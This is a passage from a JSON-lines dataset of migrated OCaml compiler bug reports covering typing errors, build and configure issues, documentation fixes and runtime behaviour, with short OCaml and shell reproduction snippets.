buffer.\n\n## Steps to reproduce\n\nPaste the attached source snippet into the toplevel.\n\n## File attachments\n\n- [longphrase.ml](https://gist.githubusercontent.com/vicuna/0e2afe31337c203d275502aafbe4c41e/raw/b7031d2856d70b8e833593308e014d1929e2733e/longphrase.ml)\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7923\r\n**Reporter:** @mlasson\r\n**Assigned to:** @dra27\r\n**Status:** assigned (set by @dra27 on 2019-02-19T18:59:12Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Category:** configure and build/install\r\n**Monitored by:** @nojb @gasche\r\n\r\n## Bug description\r\n\r\nHello, \r\n\r\nOn current trunk (4.08), the configure step is buggy for those who want to bootstrap flexdll. \r\n\r\nThere are two issues: \r\n  1. The \"IFLEXDIR\" environment variable is set at configure steps using the the output of \"flexlink\" found in the path and the user should manually set it to \"-I$(ROOT_DIR)/flexdll\" in Makefile.config. \r\n\r\n  2. The definition of \"FLEXDLL_DIR\" in the root Makefile should be moved to utils/Makefile or it won't be used (the build will run normally but the resulting compiler will complain that it cannot locate flexdll libraries). \r\n\r\nMarc.\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7922\n**Reporter:** lcorrenson\n**Assigned to:** @Octachron\n**Status:** acknowledged (set by @Octachron on 2019-02-15T09:31:18Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Category:** documentation\n**Monitored by:** @nojb @gasche\n\n## Bug description\n\nAn easy access to the index of top-level modules of the Â« standard library Â» is missing.\r\n\r\nThe only access to such an index is currently :\r\n - at the very end of the Stdlib section Â§ 23.3, spawning a list over more 5 pages on 21' screen display (sic)\r\n - among the terribly verbose index of all module names\r\n\r\nThis is very inconvenient. In OCaml 4.07 manual, the index fits into the front page of Â§26 !\r\n\r\nSource :\r\n\r\nhttps://caml.inria.fr/distrib/ocaml-4.08\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7921\n**Reporter:** blanqui\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2019-02-14T15:10:57Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.08.0+dev/beta1/beta2\n**Category:** documentation\n\n## Bug description\n\nIn http://caml.inria.fr/pub/docs/manual-ocaml/ocamldoc.html, http://www.research.att.com/sw/tools/graphviz/ is invalid. Should be https://graphviz.org/ perhaps.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7919\n**Reporter:** Vincent L\n**Assigned to:** @shindere\n**Status:** assigned (set by @xavierleroy on 2019-03-09T09:37:11Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** major\n**Platform:** Darwin\n**OS:** OSX\n**Version:** 4.08.0+dev/beta1/beta2\n**Target version:** 4.08.0+dev/beta1/beta2\n**Category:** configure and build/install\n**Monitored by:** @nojb\n\n## Bug description\n\nThe configure script relies on a `ccfamily` variable to determine what program to use as assembler (https://github.com/ocaml/ocaml/blob/trunk/configure.ac#L934).\r\n\r\nIt used to be defined there: https://github.com/ocaml/ocaml/blob/c5c0bdc8313f5f356d24a65e9305e9d454996600/configure#L409\r\n\r\nThis makes compilation of OCaml 4.08.0+beta1 fail on OSX with clang and no gcc.\r\n\r\nExample failing log: https://logs.nix.ci/?key=nixos/nixpkgs.55570&attempt_id=a52f6083-51ee-432c-bdfd-1a5704c58db1\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7918\n**Reporter:** cfranchini\n**Status:** confirmed (set by @gasche on 2019-02-15T17:59:31Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** major\n**OS:** GNU/Linux (Arch)\n**Target version:** 4.08.0+dev/beta1/beta2\n**Category:** compiler driver\n**Monitored by:** @nojb @diml\n\n## Bug description\n\nWhen compilation of a module failed because of warnings, the generated\r\nobject files are not removed. I attached a script that test just one\r\ncase - I didn't do exhaustive testing.\r\n\r\nTested on GNU/Linux (Arch) with the two following versions\r\n\r\nbranch: trunk\r\ncommit: 07794568ebdb36d121051e8003cb9ccdd88d847d\r\nverison: 4.09.0+dev0-2019-01-18\r\n\r\nbranch: 4.08\r\ncommit: a932c1a2364c26685686a1da0d2587c1e2652d1e\r\nversion: 4.08.0+dev4-2019-02-0\n\n## Steps to reproduce\n\nRun the script checkspuriousobj.sh\n\n## File attachments\n\n- [checkspuriousobj.sh](https://gist.githubusercontent.com/vicuna/5696bb60f1935478eedc7b0fff482456/raw/95608e19ada9d3a6559fb88286ad89f1dde10b2d/checkspuriousobj.sh)\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7916\r\n**Reporter:** AltGr\r\n**Assigned to:** @diml\r\n**Status:** assigned (set by @diml on 2019-02-11T13:51:57Z)\r\n**Resolution:** open\r\n**Priority:** low\r\n**Severity:** minor\r\n**Version:** 4.07.1\r\n**Category:** lexing and parsing\r\n**Monitored by:** @nojb @diml\r\n\r\n## Bug description\r\n\r\nThe manual is not very clear about the priority of the postfix `[@foo ]` notation, esp. w.r.t. infix operators. The parser defines it between `::` and INFIXOP1 (`@`, `^`), and in fact, the presence of attributes can change the meaning of an expression, which I find surprising.\r\n\r\nThere may be good reasons for this though ?\r\n\r\n## Steps to reproduce\r\n\r\n```ocaml\r\n# 3 + 2 * 4;;\r\n- : int = 11\r\n# 3 + 2 [@foo] * 4;;\r\n- : int = 20\r\n```\r\n\r\n## Additional information\r\n\r\nFound this while debugging ocp-indent issue #275, https://github.com/OCamlPro/ocp-indent/issues/275\r\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7914\n**Reporter:** herbelin\n**Status:** new\n**Resolution:** open\n**Priority:** normal\n**Severity:** crash\n**Version:** 4.06.1\n**Category:** tools (ocaml{lex,yacc,dep,debug,...})\n**Monitored by:** @nojb @gasche @diml\n\n## Bug description\n\n#6684 was about printing a lazy value in ocamldebug with the generic printer. \r\nIt was fixed and this was very helpful. There is however a similar problem when trying to print lazy values with a custom printer. It either crashes with:\r\n\r\nFatal error: exception End_of_file\r\nSegmentation fault\r\n\r\nor hangs (presumably on an input_value trying to fetch the lazy value, though not fully sure on the diagnostic).\r\n\r\nThe same actually happens when printing functions with a custom printer (though the need is probably less common).\r\n\r\nI feel a bit powerless to help more.\n\n## Steps to reproduce\n\nprintf \"let n = lazy (1+1) in n\" > a.ml\r\nprintf \"let f n = print_int (Lazy.force n)\" > p.ml\r\nocamlc -g a.ml\r\nocamlc -c p.ml\r\nocamldebug ./a.out <<EOF\r\nload_printer p.cmo\r\ninstall_printer P.f\r\nbreak @ \"a\" # 21\r\nrun\r\nprint n\r\nEOF\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7913\n**Reporter:** ramsdell0\n**Assigned to:** @Octachron\n**Status:** assigned (set by @Octachron on 2019-02-18T08:45:19Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Platform:** x86_64\n**OS:** Mac OS\n**OS Version:** Mojave\n**Version:** 4.07.1\n**Category:** documentation\n**Related to:** #7804\n**Monitored by:** @nojb\n\n## Bug description\n\nThe enclosed program shows a case in which a line of text is broken in an unexpected place.  The pretty printer only allows line breaks after commas, but the program breaks a line after an open parenthesis.\r\n\r\nThe output of the enclosed program is:\r\n\r\n$ ./ppterm\r\npred(a12(x1, y1), a1234(x1, y1), a1234(x1, y1), a1234(x1, y1), a1234(\r\n     x1, y1), a1234(x1, y1))\n\n## Steps to reproduce\n\n$ ocamlc -o ppterm ppterm.ml\r\n$ ./ppterm\n\n## File attachments\n\n- [ppterm.ml](https://gist.githubusercontent.com/vicuna/09148e57514ab5ab9ff0db2506e05f83/raw/bc793a5df3dc9737f5677f3c803c860b5bae5fba/ppterm.ml)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7908\n**Reporter:** gfxmonk\n**Assigned to:** @nojb\n**Status:** resolved (set by @nojb on 2019-02-23T09:03:09Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Platform:** Linux\n**Version:** 4.07.1\n**Category:** otherlibs\n**Monitored by:** @nojb\n\n## Bug description\n\nAccording to previous patches, the code to populate a unix socket address needs to deal with a few edge cases:\r\n\r\n - unbound sender: the path should be treated as \"\"\r\n - path is terminated with a null byte: typically done on Linux, should not be included in the returned (ocaml) string\r\n - path is not terminated with a null byte: common, e.g. on Darwin / MacOS\r\n\r\nAn additional edge case it doesn't currently handle is that on Linux, \"abstract\" unix sockets are those beginning with '\\0`, which is currently interpreted as a zero-length string.\r\n\r\nThe attached patch deals with all three edge cases, with new test cases to ensure it.\n\n## Steps to reproduce\n\nSee attached patch for test cases.\n\n## File attachments\n\n- [0001-alloc_sockaddr-handle-abstract-paths.patch](https://gist.githubusercontent.com/vicuna/422918d5f54b6ca90c5ac98f957e0914/raw/083d7a961e3224f17a4bdbb0a4ed40ef994d5b6e/0001-alloc_sockaddr-handle-abstract-paths.patch)\n"},{"labels":[null,"bug",null,null,null],"text":"**Original bug ID:** 7906\n**Reporter:** saitonakamura\n**Assigned to:** @dra27\n**Status:** confirmed (set by @dra27 on 2019-01-30T07:12:23Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**OS:** Windows\n**OS Version:** 10\n**Category:** standard library\n**Duplicate of:** #7518\n**Monitored by:** @nojb @gasche\n\n## Bug description\n\nUnix.readlink(\"C:\\\\Users\\\\saito\\\\mylink\") results in \"\\??\\C:\\Users\\saito\\code\" instead of \"C:\\Users\\saito\\code\"\n\n## Steps to reproduce\n\nOn windows\r\n1. Open cmd as administrator\r\n2. Create a symlink to directory (e.g. `mklink /D mylink C:\\Users\\saito\\code`)\r\n3. Resolve it using `Unix.readlink` (e.g. `Unix.readlink(\"C:\\\\Users\\\\saito\\\\mylink\"`)\n\n## Additional information\n\nI'm not sure if it's reproducible on every Windows of just on my machine\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7905\n**Reporter:** @nojb\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2019-01-31T20:17:53Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.08.0+dev/beta1/beta2\n**Category:** typing\n**Monitored by:** @yallop\n\n## Bug description\n\nThe following is accepted in 4.07, but rejected in 4.08.\r\n\r\n<pre>\r\nmodule M : sig\r\n  type t = A of t\r\nend\r\ntype t := A.t = A of t\r\n\r\nFile \"foo.mli\", line 5, characters 34-35:\r\n5 |              type t := M.t = A of t\r\n                                      ^\r\nError: Unbound type constructor t\r\n</pre>\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7904\n**Reporter:** @nojb\n**Assigned to:** @nojb\n**Status:** resolved (set by @nojb on 2019-02-27T15:07:01Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.08.0+dev/beta1/beta2\n**Category:** configure and build/install\n\n## Bug description\n\nUnless I missed something there is no way to disable the Unicode runtime using the configure script under Windows.\r\n\r\nA switch --disable-windows-unicode would be a useful thing to have.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7903\n**Reporter:** lindig\n**Assigned to:** @xavierleroy\n**Status:** resolved (set by @xavierleroy on 2019-03-11T09:40:14Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Platform:** Unix\n**OS:** Linux\n**Version:** 4.07.1\n**Target version:** 4.09.0+dev\n**Fixed in version:** 4.09.0+dev\n**Category:** runtime system and C interface\n**Monitored by:** robhoes @ygrek\n\n## Bug description\n\nA thread in Thread.delay won't receive a signal like SIGTERM in OCaml 4.07 but it did in OCaml 4.06. This makes it difficult to end a process that is delayed in a thread. This might be a deliberate change but I would like to see it discussed.\n\n## Steps to reproduce\n\n(* ocamlc -thread -o foo unix.cma  threads.cma  foo.ml \r\n *)\r\n\r\nlet on_sigterm _ =\r\n  prerr_endline \"Received signal\";\r\n  flush stderr;\r\n  exit 0\r\n\r\nlet () =\r\n  Sys.set_signal Sys.sigterm Sys.(Signal_handle on_sigterm);\r\n  Sys.catch_break true;\r\n  while true; do\r\n    Thread.delay 300.\r\n  done\r\n\r\n\r\nControl C does not end the thread while it is in Thread.delay.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7902\r\n**Reporter:** @fpottier\r\n**Assigned to:** @garrigue\r\n**Status:** acknowledged (set by @garrigue on 2019-01-29T00:53:04Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Version:** 4.07.1\r\n**Category:** typing\r\n**Monitored by:** @nojb @yallop\r\n\r\n## Bug description\r\n\r\nI have come across a code snippet where OCaml 4.07.1 infers a recursive type, even though -rectypes is off.\r\n\r\nThe code is as follows:\r\n```ocaml\r\ntype ('a, 'b) segment =\r\n  | SegNil  : ('a, 'a) segment\r\n  | SegCons : ('a * 'a, 'b) segment -> ('a, 'b) segment\r\n\r\nlet color (* : type a b . (a, b) segment -> int *) =\r\n  fun s ->\r\n    match s with\r\n    | SegNil ->\r\n        0\r\n    | SegCons SegNil ->\r\n        0\r\n    | SegCons _ ->\r\n        0\r\n```\r\nHere is the inferred type:\r\n```\r\nval color : ('a * 'a as 'a, 'a) segment -> int = <fun>\r\n```\r\nIf I uncomment the type annotation, the code is accepted (as it should be).\r\n\r\nIf I turn on -principal, the code is rejected (as it should be).\r\n\r\nStill, I find it strange that a recursive type is allowed to appear when -rectypes is off.\r\n"},{"labels":[null,null,"bug",null],"text":"**Original bug ID:** 7900\n**Reporter:** Vincent Cheval\n**Status:** acknowledged (set by @nojb on 2019-01-24T09:41:11Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** major\n**Platform:** Mac OS X and Unix\n**OS:** MacOs 10.14 and Unbuntu\n**Version:** 4.07.1\n**Category:** back end (clambda to assembly)\n**Monitored by:** @nojb @glondu\n\n## Bug description\n\nHello,\r\n\r\nI noticed that when we define mutual recursive functions that are tail recursive, the number of arguments  impacts  whether or not ocamlopt actually optimize the functions. More specifically, as soon as there is more than 10 arguments (strictly) then the calls are not optimized anymore. Is it an expected behavior ? If so, would it be possible that the flag [@tailcall] detects this or at least to include the expected behavior in the documentation ? Because all my examples (even the one not working do not raise any flags). \r\n\r\nNote that when the function is not mutual recursive, the number of argument does not seem to be problematic.\r\n\r\nNote also that if the mutual recursive functions have less then 10 arguments but another function is defined inside them then the problem also arises.\r\n\r\nBest,\r\nVincent Cheval\n\n## Steps to reproduce\n\nI put below different cases that I tried to determine the behavior of ocamlopt.\r\n\r\n\r\n(* This function is tail recursive and behaves accordingly with ocamlopt *)\r\nlet rec test1 x1 x2 x3 x4 x5 x6 x7 x8 x9 x10 x11 x12 x13 x14 x15 =\r\n  let stack = Gc.stat () in\r\n  Printf.printf \"test1 (%d)\\n%!\" stack.Gc.stack_size;\r\n  (test1[@tailcall]) (x1+1) (x2+1) (x3+1) (x4+1) (x5+1) (x6+1) (x7+1) (x8+1) (x9+1) (x10+1) (x11+1) (x12+1) (x13+1) (x14+1) (x15+1)\r\n\r\nlet _ = test1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1\r\n\r\n\r\n(* These functions are tail recursive and behaves accordingly with ocamlopt *)\r\nlet rec test1 x1 x2 x3 x4 x5 x6 x7 x8 x9 x10 =\r\n  let stack = Gc.stat () in\r\n  Printf.printf \"test1 (%d)\\n%!\" stack.Gc.stack_size;\r\n  (test2[@tailcall]) (x1+1) (x2+1) (x3+1) (x4+1) (x5+1) (x6+1) (x7+1) (x8+1) (x9+1) (x10+1)\r\n\r\nand test2 x1 x2 x3 x4 x5 x6 x7 x8 x9 x10 =\r\n  let stack = Gc.stat () in\r\n  Printf.printf \"test2 (%d)\\n%!\" stack.Gc.stack_size;\r\n  (test1[@tailcall]) (x1+1) (x2+1) (x3+1) (x4+1) (x5+1) (x6+1) (x7+1) (x8+1) (x9+1) (x10+1)\r\n\r\nlet _ = test1 1 1 1 1 1 1 1 1 1 1\r\n\r\n\r\n(* These functions are tail recursive but do not behave accordingly with ocamlopt *)\r\nlet rec test1 x1 x2 x3 x4 x5 x6 x7 x8 x9 x10 x11 =\r\n  let stack = Gc.stat () in\r\n  Printf.printf \"test1 (%d)\\n%!\" stack.Gc.stack_size;\r\n  (test2[@tailcall]) (x1+1) (x2+1) (x3+1) (x4+1) (x5+1) (x6+1) (x7+1) (x8+1) (x9+1) (x10+1)\r\n\r\nand test2 x1 x2 x3 x4 x5 x6 x7 x8 x9 x10 =\r\n  let stack = Gc.stat () in\r\n  Printf.printf \"test2 (%d)\\n%!\" stack.Gc.stack_size;\r\n  (test1[@tailcall]) (x1+1) (x2+1) (x3+1) (x4+1) (x5+1) (x6+1) (x7+1) (x8+1) (x9+1) (x10+1) (x10+1)\r\n\r\nlet _ = test1 1 1 1 1 1 1 1 1 1 1 1\r\n\r\n\r\n(* These functions are tail recursive but do not behave accordingly with ocamlopt *)\r\nlet rec test1 x1 x2 x3 x4 x5 x6 x7 x8 x9 x10 x11 =\r\n  let stack = Gc.stat () in\r\n  Printf.printf \"test1 (%d)\\n%!\" stack.Gc.stack_size;\r\n  (test2[@tailcall]) x1\r\n\r\nand test2 x1 =\r\n  let stack = Gc.stat () in\r\n  Printf.printf \"test2 (%d)\\n%!\" stack.Gc.stack_size;\r\n  (test1[@tailcall]) (x1+1) (x1+1) (x1+1) (x1+1) (x1+1) (x1+1) (x1+1) (x1+1) (x1+1) (x1+1) (x1+1)\r\n\r\nlet _ = test1 1 1 1 1 1 1 1 1 1 1 1\r\n\r\n(* These functions are tail recursive but do not behave accordingly with ocamlopt *)\r\nlet rec test1 x1 x2 x3 x4 x5 x6 x7 x8 x9 x10 =\r\n  let stack = Gc.stat () in\r\n  Printf.printf \"test1 (%d)\\n%!\" stack.Gc.stack_size;\r\n  let sub_test1 z =\r\n    (test2[@tailcall]) (x1+x2+x3+x4+x5+x6+x7+x8+x9+x10+z)\r\n  in\r\n  (sub_test1[@tailcall]) (x1+1)\r\n\r\nand test2 x1 =\r\n  let stack = Gc.stat () in\r\n  Printf.printf \"test2 (%d)\\n%!\" stack.Gc.stack_size;\r\n  (test1[@tailcall]) (x1+1) (x1+1) (x1+1) (x1+1) (x1+1) (x1+1) (x1+1) (x1+1) (x1+1) (x1+1)\r\n\r\nlet _ = test1 1 1 1 1 1 1 1 1 1 1\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7898\r\n**Reporter:** @psteckler\r\n**Status:** confirmed (set by @Octachron on 2019-01-17T22:27:53Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** crash\r\n**Platform:** x86_64\r\n**OS:** Linux Mint\r\n**OS Version:** 19.1\r\n**Version:** 4.07.0\r\n**Category:** compiler driver\r\n\r\n## Bug description\r\n\r\nRunning ocamlopt on a program like this:\r\n\r\n  let foo = [| (\"blah\",\"blah\");\r\n             ...\r\n            |]\r\n\r\nresults in a segfault, if the array is large enough.\r\n\r\nRunning ocamlc on the same program succeeds.\r\n\r\n## Steps to reproduce\r\n\r\nCreate foo.ml as above, run\r\n\r\n  ocamlopt foo.ml\r\n\r\n## Additional information\r\n\r\nIn my file, each string is about 90 characters.\r\n\r\nIf the number of string pairs is about 112,000, I see the segfault.\r\n\r\nIf the number of string pairs is halved to about 56,000, ocamlopt compilation succeeds.\r\n\r\nI've attached a cutdown version of the file, since the actual file is too big to attach.\r\n\r\n## File attachments\r\n\r\n- [foo_example.ml](https://gist.githubusercontent.com/vicuna/33c868588acdd7513c8ebb07a0afa650/raw/fd1862e66bdf99449a7376e0feeb71278a52527c/foo_example.ml)\r\n"},{"labels":["bug",null,null,null],"text":"**Original bug ID:** 7895\r\n**Reporter:** @db4\r\n**Status:** acknowledged (set by @nojb on 2019-01-17T13:03:56Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** major\r\n**Platform:** Windows\r\n**OS:** 10\r\n**Version:** 4.06.1\r\n**Category:** platform support (windows, cross-compilation, etc)\r\n**Monitored by:** @nojb\r\n\r\n## Bug description\r\n\r\nI'm trying to setup MSVC-compiled OCaml toolchain via OPAM 2.0. In my case it means that the compiler is built from sources in \"C:\\Users\\dbely\\.opam\\4.06.1+vc15+x86\\.opam-switch\\build\\ocaml-variants.4.06.1+win32\" folder. During opt build \"utils/strongly_connected_components.ml\" is compiled and the following line is generated for MASM:\r\n\r\n\tmov\teax, OFFSET _camlStrongly_connected_components__anon$2dfn$5bC$3a$5cUsers$5cdbely$5c$2eopam$5c4$2e06$2e1$2bvc15$2bx86$5c$2eopam$2dswitch$5cbuild$5cocaml$2dvariants$2e4$2e06$2e1$2bwin32$5cutils$5cstrongly_connected_components$2eml$3a155$2c26$2d$2d29$5d_388_closure\r\n\r\n_camlStrongly_... identifier is 251 character long. It is too much for MASM (the limit is 247 chars) and it reports\r\n\r\ncamlasm00e3f6.asm(919) : error A2043:identifier too long\r\n\r\nMaybe knowing that limitation OCaml compiler should not include the full source path into identifier names? For instance, maybe use md5 digests instead?\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7894\r\n**Reporter:** wlitwin\r\n**Assigned to:** @lpw25\r\n**Status:** assigned (set by @lpw25 on 2019-02-15T10:13:47Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** crash\r\n**Version:** 4.07.0\r\n**Category:** typing\r\n**Monitored by:** @nojb @gasche\r\n\r\n## Bug description\r\n\r\nOCaml 4.07.0 fails to compile the following program:\r\n\r\n```ocaml\r\nclass basicWidget app = object(self)\r\n    method invalidate : unit =\r\n        app#redrawWidget self\r\nend\r\n\r\nclass simple app =\r\n    let label1 = new basicWidget app in\r\nobject(self)\r\n    inherit basicWidget app\r\nend\r\n\r\nlet _ = new simple (object end)\r\n```\r\n\r\n## Steps to reproduce\r\n\r\npaste the description code into a src file and try building with:\r\n\r\n```\r\nocamlc file.ml\r\n```\r\n\r\nThe following happens:\r\n\r\n```\r\nFatal error: exception File \"typing/typeclass.ml\", line 294, characters 12-18: Assertion failed\r\n```\r\n\r\n## File attachments\r\n\r\n- [main.ml](https://gist.githubusercontent.com/vicuna/bb5fb9d3a41986ee9201730f55ddb39f/raw/3de80c24a0b196138404be8242d7bef9e97db170/main.ml)\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7886\r\n**Reporter:** dinosaure\r\n**Status:** acknowledged (set by @diml on 2019-01-07T13:22:55Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Category:** language features\r\n**Monitored by:** @nojb @gasche\r\n\r\n## Bug description\r\n\r\nMay be it's not an issue but I expect to discard the warning 34 in some pieces of my code instead to have a global `[@@@warning \"-34\"]` in my code. So, `type[@warning \"-34\"]` should work.\r\n\r\nCurrently on OCaml 4.07.0.\r\n\r\n## Steps to reproduce\r\n\r\n```\r\n$ touch test.mli\r\n$ echo 'type[@warning \"-34\"] foo = unit' > test.ml\r\n$ ocamlc -w @34 test.mli test.ml\r\nError (warning 34): unused type foo.\r\n```\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7884\n**Reporter:** @yallop\n**Assigned to:** @yallop\n**Status:** resolved (set by @yallop on 2018-12-21T19:30:48Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** language features\n**Monitored by:** @nojb\n\n## Bug description\n\nThis is allowed in a signature:\r\n\r\n  module rec X : T\r\n         and Y : T with type t = int\r\n\r\nand this is allowed, too:\r\n\r\n  module rec X : T with type t = int [@@foo]\r\n         and Y : T\r\n\r\nbut this is currently rejected as a syntax error:\r\n\r\n  module rec X : T with type t = int\r\n         and Y : T\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7883\r\n**Reporter:** @SkySkimmer\r\n**Assigned to:** @jhjourdan\r\n**Status:** resolved (set by @jhjourdan on 2019-02-02T10:24:03Z)\r\n**Resolution:** fixed\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Fixed in version:** 4.08.0+dev/beta1/beta2\r\n**Category:** runtime system and C interface\r\n**Monitored by:** @nojb\r\n\r\n## Bug description\r\n\r\nsignals_are_pending got renamed to signals_might_be_pending in https://github.com/ocaml/ocaml/commit/1c82c481a5b33987e05012be61893c03f59ef361 (4.08)\r\nA compatibility #define should be added to compatibility.h\r\n\r\nContext: we use it in Coq (https://github.com/coq/coq/blob/d501e6f301f1c023e57f14ee3441553c530d9394/kernel/byterun/coq_interp.c#L429)\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7881\n**Reporter:** filliatr\n**Assigned to:** @Armael\n**Status:** resolved (set by @nojb on 2018-12-16T17:50:04Z)\n**Resolution:** fixed\n**Severity:** minor\n**Version:** 4.08.0+dev/beta1/beta2\n**Category:** documentation\n**Monitored by:** @nojb\n\n## Bug description\n\nThe documentation for Queue.of_seq says \"Create an array...\" instead of \"Create a queue...\" (most likely a copy-paste from module Array).\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7880\n**Reporter:** @hhugo\n**Assigned to:** @lpw25\n**Status:** closed (set by @lpw25 on 2018-12-02T14:31:46Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** typing\n\n## Bug description\n\nTrying to compile base (from janestreet) with trunk, I get plenty of warning 66 \r\n\r\nFile \"lib/base/boot/stringable.ml\", line 3, characters 0-12:                                                                                                                                                \r\n3 | open! Import                                                                                                                                                                                            \r\n    ^^^^^^^^^^^^                                                                                                                                                                                            \r\nError (warning 66): unused open! Base_boot__.Import.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7879\n**Reporter:** @hhugo\n**Assigned to:** @nojb\n**Status:** resolved (set by @Octachron on 2018-12-04T16:08:43Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.08.0+dev/beta1/beta2\n**Category:** standard library\n**Monitored by:** @nojb\n\n## Bug description\n\nFix at https://github.com/ocaml/ocaml/pull/2178\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7877\n**Reporter:** mdl\n**Assigned to:** @yallop\n**Status:** resolved (set by @yallop on 2018-11-26T06:33:49Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.07.1\n**Category:** typing\n\n## Bug description\n\nI have attached a file: one where the function \"Tl.tl\" types, and one where the function \"To_string.to_string\" types; each file needs a slightly different definition of \"t\" in order for the corresponding function to typecheck. But no amount of annotation seems to allow for a \"t\" that can type both some version of \"tl\" and \"to_string\".\r\n\r\nJust as a sanity check, I tried writing an equivalent of to_string.ml in GHC Haskell using its GADTs extension, and I can get \"tl\" to type there, so I don't *think* I'm doing something wrong, but if I am, then sorry for the support ticket masquerading as a bug.  :)\n\n## File attachments\n\n- [GADTs.hs](https://gist.githubusercontent.com/vicuna/8977ad7a257b3a6eabb1b4a462a00586/raw/d62f8d2f5030aa21e578e6d62aa52c1f25a3b15c/GADTs.hs)\n- [bug.ml](https://gist.githubusercontent.com/vicuna/8977ad7a257b3a6eabb1b4a462a00586/raw/f04119c8023bc11ed660c570153a083a725995ec/bug.ml)\n- [fix.ml](https://gist.githubusercontent.com/vicuna/8977ad7a257b3a6eabb1b4a462a00586/raw/61d235be891fb9ca57d3cf8ba872781e5506cd21/fix.ml)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7876\n**Reporter:** @ejgallego\n**Assigned to:** @lpw25\n**Status:** resolved (set by @lpw25 on 2018-12-08T15:19:46Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Platform:** Linux\n**OS:** Ubuntu\n**OS Version:** 18.04\n**Category:** dynlink and natdynlink\n**Monitored by:** @nojb\n\n## Bug description\n\nDear OCaml devs,\r\n\r\nwe are testing Coq with OCaml trunk (https://github.com/coq/coq/pull/8856) and indeed it seems that in the Dune build with plugins we are finding a linking problem likely related to https://github.com/ocaml/ocaml/pull/1063\r\n\r\n```\r\n$ make -f Makefile.dune world\r\n...\r\n(cd _build/default && ../install/default/bin/coqtop -boot -coqlib . -noinit -R theories Coq -compile theories/Init/Notations.v)\r\nFile \"./theories/Init/Notations.v\", line 128, characters 0-32:\r\nError: while loading\r\n/home/egallego/external/coq-master/_build/default/plugins/ltac/ltac_plugin.cmxs:\r\nerror while linking /home/egallego/external/coq-master/_build/default/plugins/ltac/ltac_plugin.cmxs.\r\nThe module `Ltac_plugin__Tacarg' is not yet initialized\r\n```\r\nI've tried to minimize the problem without success so far :(\r\n\r\nAt the suggestion of the Dune devs I disabled \"wrapping\" for the Ltac plugin, however the same error persists:\r\n```\r\nThe module Tacarg is not yet initialized\r\n```\r\nthus this seems unrelated to packing.\r\n\r\nSee below for `ocamlobjinfo` information.\n\n## Steps to reproduce\n\nIn a context with OCaml master, checkout https://github.com/coq/coq/pull/8856 and do make -f Makefile.dune trunk\n\n## Additional information\n\nInformation about `ocamlobjinfo` for the ltac_plugin [without wrapping] is at:\r\nhttps://pastebin.com/nM1XWKVr\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7874\r\n**Reporter:** @ppedrot\r\n**Assigned to:** @nojb\r\n**Status:** resolved (set by @nojb on 2018-11-21T19:44:13Z)\r\n**Resolution:** fixed\r\n**Priority:** normal\r\n**Severity:** tweak\r\n**Version:** 4.07.1\r\n**Category:** runtime system and C interface\r\n**Monitored by:** @nojb\r\n\r\n## Bug description\r\n\r\nCurrently, String.equal is defined as a C stub without any annotation. It should be marked as noalloc, as it does not mess with the GC.\r\n"},{"labels":["bug"],"text":"**Original bug ID:** 1463\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Dr Lee Hunt McDonald\nVersion: OCaml 3.02, 3.06\nOS: Redhat Linux 8.0\nSubmission from: dsl093-162-077.tus1.dsl.speakeasy.net (66.93.162.77)\n\n\nI realized that my previous bug report was just about an interesting feature of\nmutable data structures : you need to do liberal doses of copying to 